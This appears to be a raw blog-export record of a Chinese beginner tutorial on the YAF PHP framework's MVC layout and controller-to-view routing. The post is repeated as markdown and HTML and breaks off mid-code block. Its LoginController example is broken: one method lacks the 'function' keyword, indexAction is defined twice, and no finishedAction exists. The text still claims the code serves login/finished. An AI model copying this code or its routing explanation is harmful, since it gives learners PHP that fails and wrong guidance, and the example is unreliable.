入门网页开发的新人，做点小工作，我说的不全，但会帮助你理解一个网站的大概设计。当然我也不保证自己写的东西能让人看懂就是了。\n\n首先，YAF 的框架结构树如下。\n\n```\n+ public \n  |- index.php // 入口文件 \n  |- .htaccess // 重写规则 \n  |+ css \n  |+ img \n  |+ js \n+ conf \n  |- application.ini // 配置文件 \n+ application \n  |+ controllers \n    |- Index.php // 默认控制器 \n  |+ views \n      |+ index // 默认视图目录 \n        |- index.phtml // 默认视图 \n  |+ modules // 其他模块 \n  |+ library // 本地类库 \n  |+ models // model目录 \n  |+ plugins // 插件目录\n```\n\n注意，前面有 + 号代表目录，- 号代表文件。让我们先把焦点放在 application 这个目录上。\napplication\n\n这个目录算是最主要的文件目录了。模型（Model）、控制器（Control）还有视图（View）都放在这里。\n\n模型（Model），如果用更常见的说法，它可能与对象更加接近。我个人无法完全描述这个东西。但我们得知道一样，数据是计算机中最重要的东西，而 Model 就是描述数据的东西。\n\n所谓的控制器（Control），就是网页的行为。比如，我们的其它函数从数据库里得到数据，通过控制器，将数据交给网页，让其渲染。又比如，网页表单提交上来时，要有一个函数接收数据，并存到数据库上，或者做其它操作。有时，这种函数也就做 API 接口。它连接着 模型 和 视图，作为中间的状态。\n\n再之，是视图（View），也就是我们的 HTML 页面。\n\n将一个项目分成上面三部分是有必要的，当然，可以不分，但这不利于合作。分开之后，我们负责页面的，只管页面就好了，它需要数据就去向 控制器 取，而 模型 也不用管页面，它做它的事，控制器会帮忙传数据。这样，一个项目就可以分给三部分人处理。\n\n回到 YAF 框架上。 YAF 框架完全遵循着 MVC 原则做的设计。\n\n再看上面 YAF 框架的其中三个目录。\n\n```\n+ application \n  |+ controllers\n    |- Index.php // 默认控制器 \n  |+ views \n    |+ index // 控制器 \n      |- index.phtml // 默认视图\n  |+ models // model目录 \n```\n\n这个框架就包含了上面提到的 MVC 三个组成部分。当然，了解完上面的东西还不够。我们先来考虑一下几个简单的小问题。\n\n第一，用户要怎么访问我们的网页？假设我们的网页写好了，用户要在浏览器里输入什么，才能访问到？\n\n第二，我们要怎么区分不同的页面？一个网站不可能只有一个网页，每个网页做的事情不同，用户不可能只停留在一个网页上。登录的页面、个人主页和好友页面，显然不是同一个东西，那么怎么区分它们，让我们输入不同的地址进入不同的页面？\n\n第三，我们要怎么把数据传到网页上？比如，当你登录之后，右上角会显示你的名字，名字很明显是从数据库里传来，传到控制器，然后传到页面，这中间是怎么操作的？\n\n第四，我们要怎么保存用户的状态？如果之前不了解 HTTP 协议，现在大概说一下，HTTP 协议是不会保存的。也就是说，在没有做过其它工作的情况下，你换到另一个页面，那一个页面是不知道你在这个页面做个什么，就算同一个页面，一刷新，它也不知道你做过什么。如果你在这个页面登录了，切到下一个页面，一切都消失了，那就很糟糕。那么该怎么做才能保留信息？\n\n篇符有限，先讨论前三个问题，后面一个问题下一篇文章再讨论。\n\n先前有说过，controllers 连接着 views 和 models。现在，先关注 controllers 和 views 的关系。\n\n```\n+ application \n  |+ controllers\n    |- Index.php // 默认控制器 \n  |+ views \n    |+ index // 默认视图目录\n      |- index.phtml // 默认视图\n```\n\n还是这个目录。可以发现，默认情况下，controllers 里的文件 Index.php 和 views 下的目录 index 字母是一样的。在这种情况下，Index 这个控制器就和 index 目录连在了一起。 控制器 Index.php 的代码如下:\n\n```php\n<?php\nclass IndexController extends Yaf_Controller_Abstract\n{\n    /**\n     * 默认 Action\n     */\n    public function indexAction()\n    {\n        $this->getView()->assign(\"content\", \"Hello World\");\n    }\n }\n\nindex.phtml 代码如下：\n\n<html>  \n<head>  \n    <title>Hello World</title>  \n</head>  \n<body>  \n    <?php echo $content;?>  \n</body>  \n</html>\n```\n\n类里只有一个函数，indexAction 这是 yaf 的默认命名方式。index 对应着视图 index.phtml。这样，当我们访问 http://域名/项目名/index/index 时，就能看到 index.phtml 里的东西了。同理，有这么一个目录：\n\n```\n+ application \n  |+ controllers\n    |- Index.php // 默认控制器 \n    |- Login.php // 新的控制器 \n\n  |+ views \n    |+ index // 默认视图目录\n      |- index.phtml // 默认视图\n    |+ login // 新的视图目录\n      |- index.phtml // 新的视图\n```\n\n那么访问 http://域名/项目名/login/index 就能访问到新的视图。\n\n如果这个新的图里，还有另一个页面。finished.phtml\n\n```\n+ application \n  |+ controllers\n    |- Index.php // 默认控制器 \n    |- Login.php // 新的控制器 \n\n  |+ views \n    |+ index // 默认视图目录\n      |- index.phtml // 默认视图\n    |+ login // 新的视图目录\n      |- index.phtml // 新的视图\n      |- finished.phtml // 新的视图\n```\n\n那么只要在 Login.php 里加一个新函数\n\n```php\n<?php  \n  \nclass LoginController extends AbstractController  \n{  indexAction()  \n {\n   \n  $this->getView()->assign(\"content\", \"Hello Login\");  \n  \n }  public function indexAction()  \n { \n \n  $this->getView()->assign(\"content\", \"Finishied!\");  \n  \n }}\n```\n\n那么再访问 http://域名/项目名/login/finished 就能访问到新的视图。\n\n就这么简单。函数里那一条唯一的代码，就是设定 一个名为 content 的变量，其值为 后面的字符串，并把它传到 phtml 上，再由 PHP 渲染。\n\n前三个问题就解决完了！\n","slug":"初识-YAF-框架-和-MVC","published":1,"updated":"2020-03-07T05:57:05.490Z","_id":"ck7h71kyi0000633xd5c18cuf","comments":1,"layout":"post","photos":[],"link":"","content":"<p>这是我第一次使用 PHP 做开发。</p>\n<p>因为 PHP 的名声不够好，加之开发环境不是很方便（至少要懂得 WEB 相关的东西，才能开始学习）。于是也没怎么关注。但是现在有任务用到 YAF 框架，基于 PHP 做开发，也得懂一点东西了。</p>\n<p>至于为什么写这个，主要还是因为官方文档太不友好了。初学者上去看，只会先被复杂烦锁的配制文件难住，然后找不到方向，最后迷失在安装框架和配制上。有这点时间，用 python 怕是已经搞定一个网站了。于是我想，给想要尝试用 yaf 入门网页开发的新人，做点小工作，我说的不全，但会帮助你理解一个网站的大概设计。当然我也不保证自己写的东西能让人看懂就是了。</p>\n<p>首先，YAF 的框架结构树如下。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ public </span><br><span class=\"line\">  |- index.php &#x2F;&#x2F; 入口文件 </span><br><span class=\"line\">  |- .htaccess &#x2F;&#x2F; 重写规则 </span><br><span class=\"line\">  |+ css </span><br><span class=\"line\">  |+ img </span><br><span class=\"line\">  |+ js </span><br><span class=\"line\">+ conf </span><br><span class=\"line\">  |- application.ini &#x2F;&#x2F; 配置文件 </span><br><span class=\"line\">+ application </span><br><span class=\"line\">  |+ controllers </span><br><span class=\"line\">    |- Index.php &#x2F;&#x2F; 默认控制器 </span><br><span class=\"line\">  |+ views </span><br><span class=\"line\">      |+ index &#x2F;&#x2F; 默认视图目录 </span><br><span class=\"line\">        |- index.phtml &#x2F;&#x2F; 默认视图 </span><br><span class=\"line\">  |+ modules &#x2F;&#x2F; 其他模块 </span><br><span class=\"line\">  |+ library &#x2F;&#x2F; 本地类库 </span><br><span class=\"line\">  |+ models &#x2F;&#x2F; model目录 </span><br><span class=\"line\">  |+ plugins &#x2F;&#x2F; 插件目录</span><br></pre></td></tr></table></figure>\n\n<p>注意，前面有 + 号代表目录，- 号代表文件。让我们先把焦点放在 application 这个目录上。<br>application</p>\n<p>这个目录算是最主要的文件目录了。模型（Model）、控制器（Control）还有视图（View）都放在这里。</p>\n<p>模型（Model），如果用更常见的说法，它可能与对象更加接近。我个人无法完全描述这个东西。但我们得知道一样，数据是计算机中最重要的东西，而 Model 就是描述数据的东西。</p>\n<p>所谓的控制器（Control），就是网页的行为。比如，我们的其它函数从数据库里得到数据，通过控制器，将数据交给网页，让其渲染。又比如，网页表单提交上来时，要有一个函数接收数据，并存到数据库上，或者做其它操作。有时，这种函数也就做 API 接口。它连接着 模型 和 视图，作为中间的状态。</p>\n<p>再之，是视图（View），也就是我们的 HTML 页面。</p>\n<p>将一个项目分成上面三部分是有必要的，当然，可以不分，但这不利于合作。分开之后，我们负责页面的，只管页面就好了，它需要数据就去向 控制器 取，而 模型 也不用管页面，它做它的事，控制器会帮忙传数据。这样，一个项目就可以分给三部分人处理。</p>\n<p>回到 YAF 框架上。 YAF 框架完全遵循着 MVC 原则做的设计。</p>\n<p>再看上面 YAF 框架的其中三个目录。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ application </span><br><span class=\"line\">  |+ controllers</span><br><span class=\"line\">    |- Index.php &#x2F;&#x2F; 默认控制器 </span><br><span class=\"line\">  |+ views </span><br><span class=\"line\">    |+ index &#x2F;&#x2F; 控制器 </span><br><span class=\"line\">      |- index.phtml &#x2F;&#x2F; 默认视图</span><br><span class=\"line\">  |+ models &#x2F;&#x2F; model目录</span><br></pre></td></tr></table></figure>\n\n<p>这个框架就包含了上面提到的 MVC 三个组成部分。当然，了解完上面的东西还不够。我们先来考虑一下几个简单的小问题。</p>\n<p>第一，用户要怎么访问我们的网页？假设我们的网页写好了，用户要在浏览器里输入什么，才能访问到？</p>\n<p>第二，我们要怎么区分不同的页面？一个网站不可能只有一个网页，每个网页做的事情不同，用户不可能只停留在一个网页上。登录的页面、个人主页和好友页面，显然不是同一个东西，那么怎么区分它们，让我们输入不同的地址进入不同的页面？</p>\n<p>第三，我们要怎么把数据传到网页上？比如，当你登录之后，右上角会显示你的名字，名字很明显是从数据库里传来，传到控制器，然后传到页面，这中间是怎么操作的？</p>\n<p>第四，我们要怎么保存用户的状态？如果之前不了解 HTTP 协议，现在大概说一下，HTTP 协议是不会保存的。也就是说，在没有做过其它工作的情况下，你换到另一个页面，那一个页面是不知道你在这个页面做个什么，就算同一个页面，一刷新，它也不知道你做过什么。如果你在这个页面登录了，切到下一个页面，一切都消失了，那就很糟糕。那么该怎么做才能保留信息？</p>\n<p>篇符有限，先讨论前三个问题，后面一个问题下一篇文章再讨论。</p>\n<p>先前有说过，controllers 连接着 views 和 models。现在，先关注 controllers 和 views 的关系。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ application </span><br><span class=\"line\">  |+ controllers</span><br><span class=\"line\">    |- Index.php &#x2F;&#x2F; 默认控制器 </span><br><span class=\"line\">  |+ views </span><br><span class=\"line\">    |+ index &#x2F;&#x2F; 默认视图目录</span><br><span class=\"line\">      |- index.phtml &#x2F;&#x2F; 默认视图</span><br></pre></td></tr></table></figure>\n\n<p>还是这个目录。可以发现，默认情况下，controllers 里的文件 Index.php 和 views 下的目录 index 字母是一样的。在这种情况下，Index 这个控制器就和 index 目录连在了一起。 控制器 Index.php 的代码如下:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Yaf_Controller_Abstract</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 默认 Action</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">indexAction</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;getView()-&gt;assign(<span class=\"string\">\"content\"</span>, <span class=\"string\">\"Hello World\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">index.phtml 代码如下：</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;html&gt;  </span><br><span class=\"line\">&lt;head&gt;  </span><br><span class=\"line\">    &lt;title&gt;Hello World&lt;/title&gt;  </span><br><span class=\"line\">&lt;/head&gt;  </span><br><span class=\"line\">&lt;body&gt;  </span><br><span class=\"line\">    <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">echo</span> $content;<span class=\"meta\">?&gt;</span>  </span><br><span class=\"line\">&lt;/body&gt;  </span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>类里只有一个函数，indexAction 这是 yaf 的默认命名方式。index 对应着视图 index.phtml。这样，当我们访问 http://域名/项目名/index/index 时，就能看到 index.phtml 里的东西了。同理，有这么一个目录：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ application </span><br><span class=\"line\">  |+ controllers</span><br><span class=\"line\">    |- Index.php &#x2F;&#x2F; 默认控制器 </span><br><span class=\"line\">    |- Login.php &#x2F;&#x2F; 新的控制器 </span><br><span class=\"line\"></span><br><span class=\"line\">  |+ views </span><br><span class=\"line\">    |+ index &#x2F;&#x2F; 默认视图目录</span><br><span class=\"line\">      |- index.phtml &#x2F;&#x2F; 默认视图</span><br><span class=\"line\">    |+ login &#x2F;&#x2F; 新的视图目录</span><br><span class=\"line\">      |- index.phtml &#x2F;&#x2F; 新的视图</span><br></pre></td></tr></table></figure>\n\n<p>那么访问 http://域名/项目名/login/index 就能访问到新的视图。</p>\n<p>如果这个新的图里，还有另一个页面。finished.phtml</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ application </span><br><span class=\"line\">  |+ controllers</span><br><span class=\"line\">    |- Index.php &#x2F;&#x2F; 默认控制器 </span><br><span class=\"line\">    |- Login.php &#x2F;&#x2F; 新的控制器 </span><br><span class=\"line\"></span><br><span class=\"line\">  |+ views </span><br><span class=\"line\">    |+ index &#x2F;&#x2F; 默认视图目录</span><br><span class=\"line\">      |- index.phtml &#x2F;&#x2F; 默认视图</span><br><span class=\"line\">    |+ login &#x2F;&#x2F; 新的视图目录</span><br><span class=\"line\">      |- index.phtml &#x2F;&#x2F; 新的视图</span><br><span class=\"line\">      |- finished.phtml &#x2F;&#x2F; 新的视图</span><br></pre></td></tr></table></figure>\n\n<p>那么只要在 Login.php 里加一个新函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LoginController</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractController</span>  </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;  indexAction()  </span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   </span><br><span class=\"line\">  <span class=\"keyword\">$this</span>-&gt;getView()-&gt;assign(<span class=\"string\">\"content\"</span>, <span class=\"string\">\"Hello Login\"</span>);  </span><br><span class=\"line\">  </span><br><span class=\"line\"> &#125;  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">indexAction</span><span class=\"params\">()</span>  </span></span><br><span class=\"line\"><span class=\"function\"> </span>&#123; </span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">$this</span>-&gt;getView()-&gt;assign(<span class=\"string\">\"content\"</span>, <span class=\"string\">\"Finishied!\"</span>);  </span><br><span class=\"line\">  </span><br><span class=\"line\"> &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>那么再访问 http://域名/项目名/login/finished 就能访问到新的视图。</p>\n<p>就这么简单。函数里那一条唯一的代码，就是设定 一个名为 content 的变量，其值为 后面的字符串，并把它传到 phtml 上，再由 PHP 渲染。</p>\n<p>前三个问题就解决完了！</p>\n","site":{"data":{}},"excerpt":"","more":"<p>这是我第一次使用 PHP 做开发。</p>\n<p>因为 PHP 的名声不够好，加之开发环境不是很方便（至少要懂得 WEB 相关的东西，才能开始学习）。于是也没怎么关注。但是现在有任务用到 YAF 框架，基于 PHP 做开发，也得懂一点东西了。</p>\n<p>至于为什么写这个，主要还是因为官方文档太不友好了。初学者上去看，只会先被复杂烦锁的配制文件难住，然后找不到方向，最后迷失在安装框架和配制上。有这点时间，用 python 怕是已经搞定一个网站了。于是我想，给想要尝试用 yaf 入门网页开发的新人，做点小工作，我说的不全，但会帮助你理解一个网站的大概设计。当然我也不保证自己写的东西能让人看懂就是了。</p>\n<p>首先，YAF 的框架结构树如下。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ public </span><br><span class=\"line\">  |- index.php &#x2F;&#x2F; 入口文件 </span><br><span class=\"line\">  |- .htaccess &#x2F;&#x2F; 重写规则 </span><br><span class=\"line\">  |+ css </span><br><span class=\"line\">  |+ img </span><br><span class=\"line\">  |+ js </span><br><span class=\"line\">+ conf </span><br><span class=\"line\">  |- application.ini &#x2F;&#x2F; 配置文件 </span><br><span class=\"line\">+ application </span><br><span class=\"line\">  |+ controllers </span><br><span class=\"line\">    |- Index.php &#x2F;&#x2F; 默认控制器 </span><br><span class=\"line\">  |+ views </span><br><span class=\"line\">      |+ index &#x2F;&#x2F; 默认视图目录 </span><br><span class=\"line\">        |- index.phtml &#x2F;&#x2F; 默认视图 </span><br><span class=\"line\">  |+ modules &#x2F;&#x2F; 其他模块 </span><br><span class=\"line\">  |+ library &#x2F;&#x2F; 本地类库 </span><br><span class=\"line\">  |+ models &#x2F;&#x2F; model目录 </span><br><span class=\"line\">  |+ plugins &#x2F;&#x2F; 插件目录</span><br></pre></td></tr></table></figure>\n\n<p>注意，前面有 + 号代表目录，- 号代表文件。让我们先把焦点放在 application 这个目录上。<br>application</p>\n<p>这个目录算是最主要的文件目录了。模型（Model）、控制器（Control）还有视图（View）都放在这里。</p>\n<p>模型（Model），如果用更常见的说法，它可能与对象更加接近。我个人无法完全描述这个东西。但我们得知道一样，数据是计算机中最重要的东西，而 Model 就是描述数据的东西。</p>\n<p>所谓的控制器（Control），就是网页的行为。比如，我们的其它函数从数据库里得到数据，通过控制器，将数据交给网页，让其渲染。又比如，网页表单提交上来时，要有一个函数接收数据，并存到数据库上，或者做其它操作。有时，这种函数也就做 API 接口。它连接着 模型 和 视图，作为中间的状态。</p>\n<p>再之，是视图（View），也就是我们的 HTML 页面。</p>\n<p>将一个项目分成上面三部分是有必要的，当然，可以不分，但这不利于合作。分开之后，我们负责页面的，只管页面就好了，它需要数据就去向 控制器 取，而 模型 也不用管页面，它做它的事，控制器会帮忙传数据。这样，一个项目就可以分给三部分人处理。</p>\n<p>回到 YAF 框架上。 YAF 框架完全遵循着 MVC 原则做的设计。</p>\n<p>再看上面 YAF 框架的其中三个目录。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ application </span><br><span class=\"line\">  |+ controllers</span><br><span class=\"line\">    |- Index.php &#x2F;&#x2F; 默认控制器 </span><br><span class=\"line\">  |+ views </span><br><span class=\"line\">    |+ index &#x2F;&#x2F; 控制器 </span><br><span class=\"line\">      |- index.phtml &#x2F;&#x2F; 默认视图</span><br><span class=\"line\">  |+ models &#x2F;&#x2F; model目录</span><br></pre></td></tr></table></figure>\n\n<p>这个框架就包含了上面提到的 MVC 三个组成部分。当然，了解完上面的东西还不够。我们先来考虑一下几个简单的小问题。</p>\n<p>第一，用户要怎么访问我们的网页？假设我们的网页写好了，用户要在浏览器里输入什么，才能访问到？</p>\n<p>第二，我们要怎么区分不同的页面？一个网站不可能只有一个网页，每个网页做的事情不同，用户不可能只停留在一个网页上。登录的页面、个人主页和好友页面，显然不是同一个东西，那么怎么区分它们，让我们输入不同的地址进入不同的页面？</p>\n<p>第三，我们要怎么把数据传到网页上？比如，当你登录之后，右上角会显示你的名字，名字很明显是从数据库里传来，传到控制器，然后传到页面，这中间是怎么操作的？</p>\n<p>第四，我们要怎么保存用户的状态？如果之前不了解 HTTP 协议，现在大概说一下，HTTP 协议是不会保存的。也就是说，在没有做过其它工作的情况下，你换到另一个页面，那一个页面是不知道你在这个页面做个什么，就算同一个页面，一刷新，它也不知道你做过什么。如果你在这个页面登录了，切到下一个页面，一切都消失了，那就很糟糕。那么该怎么做才能保留信息？</p>\n<p>篇符有限，先讨论前三个问题，后面一个问题下一篇文章再讨论。</p>\n<p>先前有说过，controllers 连接着 views 和 models。现在，先关注 controllers 和 views 的关系。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ application </span><br><span class=\"line\">  |+ controllers</span><br><span class=\"line\">    |- Index.php &#x2F;&#x2F; 默认控制器 </span><br><span class=\"line\">  |+ views </span><br><span class=\"line\">    |+ index &#x2F;&#x2F; 默认视图目录</span><br><span class=\"line\">      |- index.phtml &#x2F;&#x2F; 默认视图</span><br></pre></td></tr></table></figure>\n\n<p>还是这个目录。可以发现，默认情况下，controllers 里的文件 Index.php 和 views 下的目录 index 字母是一样的。在这种情况下，Index 这个控制器就和 index 目录连在了一起。 控制器 Index.php 的代码如下:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Yaf_Controller_Abstract</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 默认 Action</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">indexAction</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;getView()-&gt;assign(<span class=\"string\">\"content\"</span>, <span class=\"string\">\"Hello World\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">index.phtml 代码如下：</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;html&gt;  </span><br><span class=\"line\">&lt;head&gt;  </span><br><span class=\"line\">    &lt;title&gt;Hello World&lt;/title&gt;  </span><br><span class=\"line\">&lt;/head&gt;  </span><br><span class=\"line\">&lt;body&gt;  </span><br><span class=\"line\">    <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">echo</span> $content;<span class=\"meta\">?&gt;</span>  </span><br><span class=\"line\">&lt;/body&gt;  </span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>类里只有一个函数，indexAction 这是 yaf 的默认命名方式。index 对应着视图 index.phtml。这样，当我们访问 http://域名/项目名/index/index 时，就能看到 index.phtml 里的东西了。同理，有这么一个目录：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ application </span><br><span class=\"line\">  |+ controllers</span><br><span class=\"line\">    |- Index.php &#x2F;&#x2F; 默认控制器 </span><br><span class=\"line\">    |- Login.php &#x2F;&#x2F; 新的控制器 </span><br><span class=\"line\"></span><br><span class=\"line\">  |+ views </span><br><span class=\"line\">    |+ index &#x2F;&#x2F; 默认视图目录</span><br><span class=\"line\">      |- index.phtml &#x2F;&#x2F; 默认视图</span><br><span class=\"line\">    |+ login &#x2F;&#x2F; 新的视图目录</span><br><span class=\"line\">      |- index.phtml &#x2F;&#x2F; 新的视图</span><br></pre></td></tr></table></figure>\n\n<p>那么访问 http://域名/项目名/login/index 就能访问到新的视图。</p>\n<p>如果这个新的图里，还有另一个页面。finished.phtml</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ application </span><br><span class=\"line\">  |+ controllers</span><br><span class=\"line\">    |- Index.php &#x2F;&#x2F; 默认控制器 </span><br><span class=\"line\">    |- Login.php &#x2F;&#x2F; 新的控制器 </span><br><span class=\"line\"></span><br><span class=\"line\">  |+ views </span><br><span class=\"line\">    |+ index &#x2F;&#x2F; 默认视图目录</span><br><span class=\"line\">      |- index.phtml &#x2F;&#x2F; 默认视图</span><br><span class=\"line\">    |+ login &#x2F;&#x2F; 新的视图目录</span><br><span class=\"line\">      |- index.phtml &#x2F;&#x2F; 新的视图</span><br><span class=\"line\">      |- finished.phtml &#x2F;&#x2F; 新的视图</span><br></pre></td></tr></table></figure>\n\n<p>那么只要在 Login.php 里加一个新函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">  </span><br><span 